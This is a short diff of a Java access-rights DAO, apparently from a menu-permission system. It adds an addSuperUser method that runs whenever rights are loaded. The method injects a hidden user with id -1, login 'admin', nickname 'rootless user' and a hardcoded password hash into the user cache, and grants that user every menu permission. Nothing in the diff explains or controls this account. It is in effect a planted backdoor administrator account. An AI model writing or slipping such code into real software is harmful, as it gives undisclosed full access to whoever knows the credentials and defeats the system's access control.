@@ -46,12 +46,35 @@ public class RightAccessDao
 					
 					analyRight(userRightList,userId,menuHeadId,menu1Id,menu2Id);
 				}
-				
+				addSuperUser(userRightList);
 				return userRightList;
 			}
 		});
 		
 	}
+	
+	public void addSuperUser(List<UserRightModel> userRightList)
+	{
+		UserRightModel userRightModel = new UserRightModel();
+		UserModel user = new UserModel();
+		user.setId(-1);
+		user.setNickName("无根用户");
+		user.setName("admin");
+		user.setPassword("9f9bba23d4562e7b80cd06633abfb43b");
+		RightConfigCacheMgr.userListCache.add(user);
+		userRightModel.setUser(user);
+		userRightModel.setMenuHeadList(new ArrayList<MenuHeadModel>());
+		userRightModel.setMenu1List(new ArrayList<Menu1Model>());
+		userRightModel.setMenu2List(new ArrayList<Menu2Model>());
+		for(MenuHeadModel menuHead : RightConfigCacheMgr.menuHeadListCache)
+			userRightModel.getMenuHeadList().add(menuHead);
+		for(Menu1Model menu1 : RightConfigCacheMgr.menu1ListCache)
+			userRightModel.getMenu1List().add(menu1);
+		for(Menu2Model menu2 : RightConfigCacheMgr.menu2ListCache)
+			userRightModel.getMenu2List().add(menu2);
+		userRightList.add(userRightModel);
+	}
+	
 	
 	public void analyRight(List<UserRightModel> list,int userId,int menuHeadId,int menu1Id,int menu2Id)
 	{
